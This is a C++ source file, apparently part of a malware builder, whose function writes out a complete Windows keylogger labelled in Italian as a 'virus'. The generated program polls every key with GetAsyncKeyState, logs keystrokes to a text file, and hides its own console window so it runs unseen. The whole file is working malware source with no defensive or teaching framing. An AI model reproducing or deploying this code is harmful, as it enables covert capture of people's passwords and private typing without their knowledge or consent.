#include<fstream>
#include<iostream>
using namespace std;
void key_logger_1(){       

		FILE *first_key_logger;
        
		system("cd..");
        system("mkdir output");
            cout<<endl;  
     
            first_key_logger = fopen("output\\semplice keylogger.cpp","w");
            fprintf(first_key_logger," #include<iostream> \n #include<stdlib.h>\n #include<ctype.h>\n #include<string.h>\n #include<windows.h>\n using namespace std;\n int Save (int key_stroke, char *file);\n void Stealth();\n \n int main()\n {\n Stealth();\n char i;\n while (1)\n {\n for(i = 8; i <= 190; i++)\n {\n ");
            fprintf(first_key_logger,"if (GetAsyncKeyState(i) == -32767)\n Save (i,\"registered_key_output.txt\");\n }\n }\n system (\"pause\"); \n return 0; \n } \n \n int Save (int key_stroke, char *file) \n { \n if ( (key_stroke == 1) || (key_stroke == 2) )\n return 0;\n FILE *OUTPUT_FILE;\n OUTPUT_FILE = fopen(file, \"a+\");\n \n cout << key_stroke << endl; \n \n if (key_stroke == 8) \n fprintf(OUTPUT_FILE, \"%%s\", \"[BACKSPACE]\");\n else if (key_stroke == 13)\n fprintf(OUTPUT_FILE, \"%%s\", \" \");\n else if (key_stroke == 32)\n fprintf(OUTPUT_FILE, \"%%s\", \" \");\n else if (key_stroke == VK_TAB)\n fprintf(OUTPUT_FILE, \"%%s\", \"[TAB]\");\n ");
            fprintf(first_key_logger,"else if (key_stroke == VK_SHIFT)\n fprintf(OUTPUT_FILE, \"%%s\", \"[SHIFT]\");\n else if (key_stroke == VK_CONTROL)\n fprintf(OUTPUT_FILE, \"%%s\", \"[CONTROL]\");\n else if (key_stroke == VK_ESCAPE)\n fprintf(OUTPUT_FILE, \"%%s\", \"[ESCAPE]\");\n else if (key_stroke == VK_END)\n fprintf(OUTPUT_FILE, \"%%s\", \"[END]\"); \n else if (key_stroke == VK_HOME)\n fprintf(OUTPUT_FILE, \"%%s\", \"[HOME]\");\n else if (key_stroke == VK_LEFT)\n fprintf(OUTPUT_FILE, \"%%s\", \"[LEFT]\");\n else if (key_stroke == VK_UP) \n fprintf(OUTPUT_FILE, \"%%s\", \"[UP]\");\n else if (key_stroke == VK_RIGHT)\n fprintf(OUTPUT_FILE, \"%%s\", \"[RIGHT]\");\n else if (key_stroke == VK_DOWN)\n fprintf(OUTPUT_FILE, \"%%s\", \"[DOWN]\");\n else if (key_stroke == 190 || key_stroke == 110) \n ");
            fprintf(first_key_logger,"fprintf(OUTPUT_FILE, \"%%s\", \".\");\n else\n fprintf(OUTPUT_FILE, \"%%s\", &key_stroke);\n \n fclose (OUTPUT_FILE);\n return 0;\n }\n \n \n void Stealth() \n { \n HWND Stealth; \n AllocConsole(); \n Stealth = FindWindowA(\"ConsoleWindowClass\", NULL); \nShowWindow(Stealth,0); \n} \n");
            fclose(first_key_logger);
        
            ifstream check ("output\\semplice keylogger.cpp");
            if (check)
            cout <<"Virus creato correttamente. Salvato nella directory: output"<<endl;
            else
            cout<<"Errore nell\'elaborazione, il virus non e' stato creato";
}
